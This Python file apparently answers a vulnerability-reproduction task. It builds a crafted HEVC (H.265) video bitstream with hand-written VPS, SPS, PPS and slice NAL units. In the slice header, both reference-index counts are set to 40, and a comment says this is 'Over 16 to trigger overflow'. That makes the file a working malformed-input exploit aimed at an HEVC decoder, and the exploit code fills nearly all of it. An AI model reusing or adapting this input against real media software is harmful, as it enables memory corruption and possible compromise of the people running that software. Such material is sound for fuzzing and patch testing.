import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitWriter:
            def __init__(self):
                self.data = bytearray()
                self.accumulator = 0
                self.bit_count = 0

            def write(self, val, bits):
                for i in range(bits - 1, -1, -1):
                    bit = (val >> i) & 1
                    self.accumulator = (self.accumulator << 1) | bit
                    self.bit_count += 1
                    if self.bit_count == 8:
                        self.data.append(self.accumulator)
                        self.accumulator = 0
                        self.bit_count = 0

            def ue(self, val):
                if val == 0:
                    self.write(1, 1)
                else:
                    tmp = val + 1
                    length = tmp.bit_length() - 1
                    self.write(0, length)
                    self.write(tmp, length + 1)

            def se(self, val):
                if val <= 0:
                    v = -2 * val
                else:
                    v = 2 * val - 1
                self.ue(v)

            def rbsp_trailing_bits(self):
                self.write(1, 1)
                if self.bit_count > 0:
                    self.write(0, 8 - self.bit_count)

            def get_bytes(self):
                return self.data

        def make_nal(nal_type, payload):
            out = bytearray([0, 0, 0, 1])
            h1 = (nal_type << 1) & 0x7E
            h2 = 1 
            out.append(h1)
            out.append(h2)
            
            i = 0
            while i < len(payload):
                if i + 2 < len(payload) and payload[i] == 0 and payload[i+1] == 0 and payload[i+2] <= 3:
                    out.append(0)
                    out.append(0)
                    out.append(3)
                    out.append(payload[i+2])
                    i += 3
                else:
                    out.append(payload[i])
                    i += 1
            return out

        def profile_tier_level(bw):
            bw.write(0, 2) 
            bw.write(0, 1) 
            bw.write(1, 5) 
            bw.write(0x60000000, 32) 
            bw.write(0, 32)
            bw.write(0, 16)
            bw.write(30, 8) 
            
        # VPS (Type 32)
        bw = BitWriter()
        bw.write(0, 4) 
        bw.write(1, 1) 
        bw.write(1, 1) 
        bw.write(0, 6) 
        bw.write(0, 3) 
        bw.write(1, 1) 
        bw.write(0xFFFF, 16) 
        profile_tier_level(bw)
        bw.write(1, 1) 
        bw.ue(1) 
        bw.ue(0) 
        bw.ue(0) 
        bw.write(0, 6) 
        bw.ue(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.rbsp_trailing_bits()
        vps = make_nal(32, bw.get_bytes())

        # SPS (Type 33)
        bw = BitWriter()
        bw.write(0, 4) 
        bw.write(0, 3) 
        bw.write(1, 1) 
        profile_tier_level(bw)
        bw.ue(0) 
        bw.ue(1) 
        bw.ue(32) 
        bw.ue(32) 
        bw.write(0, 1) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.write(1, 1) 
        bw.ue(1) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.ue(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.ue(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.rbsp_trailing_bits()
        sps = make_nal(33, bw.get_bytes())

        # PPS (Type 34)
        bw = BitWriter()
        bw.ue(0) 
        bw.ue(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 3) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.ue(0) 
        bw.ue(0) 
        bw.se(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.se(0) 
        bw.se(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.ue(0) 
        bw.write(0, 1) 
        bw.write(0, 1) 
        bw.rbsp_trailing_bits()
        pps = make_nal(34, bw.get_bytes())

        # Slice (Type 1)
        bw = BitWriter()
        bw.write(1, 1) # first_slice_segment_in_pic_flag
        bw.ue(0) # slice_pic_parameter_set_id
        bw.ue(0) # slice_type (B)
        bw.write(1, 1) # num_ref_idx_active_override_flag
        bw.ue(40) # num_ref_idx_l0_active_minus1 (Over 16 to trigger overflow)
        bw.ue(40) # num_ref_idx_l1_active_minus1
        bw.write(0, 1) # mvd_l1_zero_flag
        bw.se(0) # slice_qp_delta
        bw.rbsp_trailing_bits()
        slice_nal = make_nal(1, bw.get_bytes())
        
        return vps + sps + pps + slice_nal
